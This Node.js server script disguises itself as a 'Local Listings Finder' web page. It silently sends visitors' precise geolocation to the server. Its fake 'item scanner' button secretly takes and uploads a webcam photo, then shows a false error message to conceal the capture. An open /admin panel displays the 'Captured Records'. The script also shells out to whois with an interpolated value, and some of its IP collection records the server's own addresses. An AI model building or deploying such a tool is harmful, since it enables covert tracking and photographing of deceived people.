const http = require("http");
const os = require("os");
const url = require("url");
const { execSync } = require("child_process");

let records = [];

function getLocalIPs() {
  try {
    const nets = os.networkInterfaces();
    const results = [];
    for (const name of Object.keys(nets)) {
      for (const net of nets[name]) {
        if (!net.internal) {
          results.push({ family: net.family, address: net.address });
        }
      }
    }
    return results;
  } catch (err) {
    console.error("Failed to fetch local IPs:", err.message);
    return [];
  }
}

function getWANIP() {
  try {
    return execSync("curl -s https://api.ipify.org").toString().trim();
  } catch {
    return null;
  }
}

function getWhois(ip) {
  try {
    return execSync(`whois ${ip}`, { timeout: 4000 }).toString();
  } catch {
    return "WHOIS lookup failed.";
  }
}

function renderAdmin() {
  let html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Panel</title>
<style>
  body { background:black; color:#0f0; font-family:monospace; padding:20px; }
  h1 { color:#0f0; font-size:1.8em; }
  .record { border:1px solid #0f0; padding:10px; margin:15px 0; }
  .label { font-weight:bold; color:#0f0; font-size:1.2em; }
  .scrollbox { border:1px solid #0f0; padding:5px; margin:10px 0; max-height:200px; overflow:auto; background:#000; color:#0f0; }
  .blue { color:#0ff; }
  .yellow { color:#ff0; }
  .cyan { color:#0ff; }
  .green { color:#0f0; }
</style>
</head>
<body>
<h1>Captured Records</h1>`;

  records.forEach((rec, idx) => {
    html += `<div class="record">
      <div class="label">Record #${idx + 1} - ${new Date(rec.time).toISOString()}</div><br>
      <span class="yellow">Server Connection IP:</span> <span class="green">${rec.serverObservedIP}</span><br>
      <span class="cyan">Public WAN IP:</span> <span class="green">${rec.externalPublicIP || "N/A"}</span><br>`;

    if (rec.localIPs && rec.localIPs.length > 0) {
      html += `<span class="label">Local IPs:</span><br>`;
      rec.localIPs.forEach(ip => {
        html += `- ${ip.family} ${ip.address}<br>`;
      });
    }
    if (rec.webrtcIPs && rec.webrtcIPs.length > 0) {
      html += `<span class="label">WebRTC IPs:</span><br>`;
      rec.webrtcIPs.forEach(ip => {
        html += `- ${ip}<br>`;
      });
    }
    if (rec.geolocation) {
      html += `<span class="label">Geolocation:</span> ${rec.geolocation.lat}, ${rec.geolocation.lng} <span class="blue">(±${rec.geolocation.acc}m)</span><br>`;
    }
    if (rec.whois) {
      html += `<span class="label">WHOIS:</span>
        <div class="scrollbox">${rec.whois.replace(/\n/g, "<br>")}</div>`;
    }
    if (rec.image) {
      html += `<span class="label">Snapshot:</span><br><img src="${rec.image}" style="max-width:100%;border:1px solid #0f0;">`;
    }
    html += `</div>`;
  });

  html += `</body></html>`;
  return html;
}

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);

  // User-facing page
  if (parsed.pathname === "/") {
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Local Listings Finder</title>
  <style>
    body { background:#f9f9f9; color:#333; font-family: "Roboto", Arial, sans-serif; margin:0; padding:0; text-align:center; }
    header { background:#1976d2; color:#fff; padding:15px; font-size:1.4em; font-weight:bold; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
    #map { width:90%; height:300px; margin:20px auto; border-radius:10px; overflow:hidden; box-shadow:0 2px 6px rgba(0,0,0,0.2); }
    button { background:#1976d2; color:#fff; font-size:1.2em; padding:12px 25px; border:none; border-radius:6px; cursor:pointer; transition:background 0.3s ease; margin-top:10px; }
    button:hover { background:#125a9c; }
    footer { margin-top:30px; font-size:0.85em; color:#777; }
  </style>
</head>
<body>
  <header>Local Listings & Price Checker</header>
  <div id="map">Loading map...</div>
  <button onclick="startScanner()">Start Item Scanner</button>
  <footer>© 2025 Local Listings Finder</footer>

  <script>
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;
        const acc = pos.coords.accuracy;
        document.getElementById('map').innerHTML =
          '<iframe width="100%" height="300" frameborder="0" style="border:0" ' +
          'src="https://www.openstreetmap.org/export/embed.html?bbox='+(lng-0.05)+'%2C'+(lat-0.05)+'%2C'+(lng+0.05)+'%2C'+(lat+0.05)+'&layer=mapnik&marker='+lat+'%2C'+lng+'" allowfullscreen></iframe>';
        fetch('/report', {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({ geolocation:{ lat:lat, lng:lng, acc:acc } })
        });
      });
    }

    function startScanner() {
      navigator.mediaDevices.getUserMedia({ video:true })
        .then(stream => {
          const track = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(track);
          return imageCapture.takePhoto();
        })
        .then(blob => {
          const reader = new FileReader();
          reader.onloadend = function() {
            fetch('/report', {
              method:'POST',
              headers:{'Content-Type':'application/json'},
              body:JSON.stringify({ image: reader.result })
            }).then(() => {
              alert("Failed to initialize camera.");
            });
          }
          reader.readAsDataURL(blob);
        })
        .catch(err => { 
          console.log("Camera error:", err); 
          alert("Failed to initialize camera."); 
        });
    }
  </script>
</body>
</html>`;
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(html);
    return;
  }

  // Admin page
  if (parsed.pathname === "/admin") {
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(renderAdmin());
    return;
  }

  // Report handler
  if (parsed.pathname === "/report" && req.method === "POST") {
    let body = "";
    req.on("data", chunk => body += chunk);
    req.on("end", () => {
      try {
        const data = JSON.parse(body);
        let rec = records[records.length - 1];
        if (!rec || Date.now() - rec.time > 10000) {
          rec = { time: Date.now() };
          rec.serverObservedIP = req.socket.remoteAddress;
          rec.localIPs = getLocalIPs();
          rec.externalPublicIP = getWANIP();
          rec.whois = rec.externalPublicIP ? getWhois(rec.externalPublicIP) : "N/A";
          records.push(rec);
        }
        if (data.geolocation) rec.geolocation = data.geolocation;
        if (data.image) rec.image = data.image;
        if (data.webrtcIPs) rec.webrtcIPs = data.webrtcIPs;
        res.writeHead(200);
        res.end("ok");
      } catch (e) {
        console.error("Report error:", e);
        res.writeHead(400);
        res.end("bad request");
      }
    });
    return;
  }

  res.writeHead(404);
  res.end("Not found");
});

server.listen(3000, () => {
  console.log("Server running on http://localhost:3000");
});
